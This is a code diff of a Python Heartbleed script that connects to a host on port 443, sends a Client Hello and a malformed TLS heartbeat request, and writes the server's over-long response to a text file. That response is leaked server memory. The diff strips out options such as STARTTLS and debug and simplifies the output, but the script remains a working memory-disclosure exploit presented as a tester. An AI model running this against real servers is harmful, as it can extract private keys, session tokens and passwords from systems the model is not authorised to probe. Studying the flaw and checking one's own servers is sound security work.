@@ -1,4 +1,3 @@
-# Usage: python heartbleed.py <host>
 
 import sys
 import struct
@@ -11,12 +10,9 @@ from optparse import OptionParser
 # Decoder for hexadecimal encoding
 decode_hex = codecs.getdecoder('hex_codec')
 
-# Option parser for command-line arguments
-options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability')
-options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
-options.add_option('-s', '--starttls', action='store_true', default=False, help='Check STARTTLS')
-options.add_option('-d', '--debug', action='store_true', default=False, help='Enable debug output')
-options.add_option('-o', '--output', type='str', default='hexdump.txt', help='Output file for hexdump (default: hexdump.txt)')
+options = OptionParser(description='Test for the Heartbleed vulnerabilit, requires a host as an argument')
+
+
 
 def hex_to_bin(hex_string):
     """Convert a hex string to binary data"""
@@ -47,17 +43,16 @@ HEARTBEAT_REQUEST_HEX = (
 client_hello = hex_to_bin(CLIENT_HELLO_HEX)
 heartbeat_request = hex_to_bin(HEARTBEAT_REQUEST_HEX)
 
-def hexdump(data, output_file):
-    """Save a hexdump of the given binary data to a file"""
+def save_server_response_to_file(data, output_file):
+    """Save a given binary data to a file as ascii characters"""
     with open(output_file, 'w') as f:
         for i in range(0, len(data), 16):
             line = data[i:i + 16]
-            hex_data = ' '.join(f'{byte:02X}' for byte in line)
             ascii_data = ''.join(chr(byte) if 32 <= byte <= 126 else '.' for byte in line)
-            f.write(f'  {i:04x}: {hex_data:<48} {ascii_data}\n')
+            f.write(f'{ascii_data}\n')
         f.write('\n')
 
-def recvall(sock, length, timeout=5):
+def receive_from_socket(sock, length, timeout=5):
     """Receive the specified length of data from the socket"""
     end_time = time.time() + timeout
     received_data = b''
@@ -75,13 +70,13 @@ def recvall(sock, length, timeout=5):
 
 def receive_message(sock):
     """Receive a message from the socket"""
-    header = recvall(sock, 5)
+    header = receive_from_socket(sock, 5)
     if not header:
         print('Unexpected EOF receiving record header - server closed connection')
         return None, None, None
 
     message_type, version, length = struct.unpack('>BHH', header)
-    payload = recvall(sock, length, 10)
+    payload = receive_from_socket(sock, length, 10)
     if not payload:
         print('Unexpected EOF receiving record payload - server closed connection')
         return None, None, None
@@ -99,11 +94,12 @@ def send_heartbeat(sock, output_file):
             return False
         if message_type == 24:
             print('Received heartbeat response:')
-            hexdump(payload, output_file)
+            save_server_response_to_file(payload, output_file)
             if len(payload) > 3:
-                print('WARNING: server returned more data than it should - server is vulnerable!')
+                print('Heartbeat response contained extra data')
+                print('Server is vulnerable to heart bleed! ')
             else:
-                print('Server processed malformed heartbeat, but did not return any extra data.')
+                print('Heartbeat response did not return any extra data.')
             return True
         if message_type == 21:
             print('Received alert:')
@@ -118,28 +114,12 @@ def main():
         return
 
     server = args[0]
-    port = opts.port
-    output_file = opts.output
+    port = 443
+    output_file = "heartbeat_response.txt"
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
         print('Connecting...')
         sock.connect((server, port))
-
-        if opts.starttls:
-            response = sock.recv(4096)
-            if opts.debug:
-                print(response)
-            sock.send(b'ehlo starttlstest\n')
-            response = sock.recv(1024)
-            if opts.debug:
-                print(response)
-            if b'STARTTLS' not in response:
-                if opts.debug:
-                    print(response)
-                print('STARTTLS not supported...')
-                sys.exit(0)
-            sock.send(b'starttls\n')
-            response = sock.recv(1024)
 
         print('Sending Client Hello...')
         sock.send(client_hello)
